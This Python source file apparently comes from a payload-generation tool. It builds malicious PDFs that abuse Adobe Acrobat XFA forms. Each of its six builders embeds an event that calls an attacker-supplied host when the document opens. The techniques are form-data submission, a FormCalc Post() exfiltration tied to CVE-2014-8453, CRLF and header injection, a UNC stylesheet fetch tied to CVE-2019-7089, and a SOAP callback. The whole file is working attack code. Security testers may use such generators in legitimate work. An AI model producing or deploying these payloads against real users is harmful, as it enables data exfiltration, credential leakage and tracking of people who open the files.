from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def _xfa_pdf(xfa_xml: str) -> bytes:
    xml_b = xfa_xml.encode("utf-8")
    head = b"%PDF-1\n" + PDF_HEADER_COMMENT
    body = (
        b"1 0 obj <<>>\nstream\n" + xml_b + b"\nendstream\nendobj\n"
        b"trailer << /Root << /AcroForm << /Fields [<< /T (0) /Kids [<< "
        b"/Subtype /Widget /Rect [] /T () /FT /Btn >>] >>] /XFA 1 0 R >> "
        b"/Pages << >> >> >>\n%%EOF\n"
    )
    return head + body


def build_xfa_submit(host: str) -> bytes:
    xml = f'''<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf><interactive>1</interactive></pdf></present></config>
<template><subform name="_"><pageSet/>
<field id="Hello World!">
  <event activity="docReady" ref="$host" name="event__click">
    <submit textEncoding="UTF-16" xdpContent="pdf datasets xfdf" target="{host}/x-submit"/>
  </event>
</field></subform></template></xdp:xdp>'''
    return _xfa_pdf(xml)


def build_xfa_formcalc_post(host: str) -> bytes:
    xml = f'''<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf><interactive>1</interactive></pdf></present></config>
<template><subform name="_"><pageSet/>
<field id="FormCalc Exfil">
  <event activity="initialize">
    <script contentType='application/x-formcalc'>
      Post("{host}/x-formcalc","formcalc-callback","text/plain","utf-8","")
    </script>
  </event>
</field></subform></template></xdp:xdp>'''
    return _xfa_pdf(xml)


def build_xfa_crlf(host: str) -> bytes:
    xml = f'''<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf><interactive>1</interactive></pdf></present></config>
<template><subform name="_"><pageSet/>
<field id="CRLF Inject">
  <event activity="docReady" ref="$host" name="event__click">
    <submit textEncoding="UTF-16&#xD;&#xA;X-Injected: true&#xD;&#xA;"
            xdpContent="pdf datasets xfdf" target="{host}/x-crlf"/>
  </event>
</field></subform></template></xdp:xdp>'''
    return _xfa_pdf(xml)


def build_xfa_header_inject(host: str) -> bytes:
    xml = f'''<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf><interactive>1</interactive></pdf></present></config>
<template><subform name="_"><pageSet/>
<field id="Header Inject">
  <event activity="initialize">
    <script contentType='application/x-formcalc'>
      Post("{host}/x-header","body","text/plain","utf-8","Content-Type: text/html&#x0d;&#x0a;X-Injected: true&#x0d;&#x0a;")
    </script>
  </event>
</field></subform></template></xdp:xdp>'''
    return _xfa_pdf(xml)


def build_xfa_xslt(host: str) -> bytes:
    unc = host.replace("https://", "").replace("http://", "").split("/")[0]
    xml = (
        '<?xml version="1.0" ?>\n'
        f'<?xml-stylesheet href="\\\\{unc}\\whatever.xslt" type="text/xsl" ?>\n'
    )
    xml_b = xml.encode("utf-8")
    head = b"%PDF-1\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj <<>>\nstream\n" + xml_b + b"\nendstream\nendobj\n"
        + b"trailer << /Root << /AcroForm << /Fields [<< /T (0) /Kids [<< "
        + b"/Subtype /Widget /Rect [] /T () /FT /Btn >>] >>] /XFA 1 0 R >> "
        + b"/Pages << >> >> >>\n%%EOF\n"
    )


def build_xfa_soap(host: str) -> bytes:
    xml = f'''<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf><interactive>1</interactive></pdf></present></config>
<template><subform name="_"><pageSet/>
<field id="SOAP Callback">
  <event activity="initialize">
    <submit method="soap" action="{host}/x-soap" soapAction="http://soap.action/ping"/>
  </event>
</field></subform></template></xdp:xdp>'''
    return _xfa_pdf(xml)


registry.register(PayloadEntry(
    id="X01", name="xfa_submit",
    builder=lambda host: build_xfa_submit(host),
    description="XFA docReady submit event",
    platform="acrobat", tags=("xfa",),
))
registry.register(PayloadEntry(
    id="X02", name="xfa_formcalc_post",
    builder=lambda host: build_xfa_formcalc_post(host),
    description="FormCalc Post() same-origin exfil (CVE-2014-8453)",
    platform="acrobat", cve="CVE-2014-8453", tags=("xfa",),
))
registry.register(PayloadEntry(
    id="X03", name="xfa_crlf",
    builder=lambda host: build_xfa_crlf(host),
    description="textEncoding CRLF request injection",
    platform="acrobat", tags=("xfa",),
))
registry.register(PayloadEntry(
    id="X04", name="xfa_header_inject",
    builder=lambda host: build_xfa_header_inject(host),
    description="FormCalc Post() arbitrary header injection",
    platform="acrobat", tags=("xfa",),
))
registry.register(PayloadEntry(
    id="X05", name="xfa_xslt",
    builder=lambda host: build_xfa_xslt(host),
    description="XFA XML stylesheet remote fetch (CVE-2019-7089)",
    platform="acrobat", cve="CVE-2019-7089", tags=("xfa", "unc"),
))
registry.register(PayloadEntry(
    id="X06", name="xfa_soap",
    builder=lambda host: build_xfa_soap(host),
    description="XFA SOAP submit on initialize",
    platform="acrobat", tags=("xfa",),
))
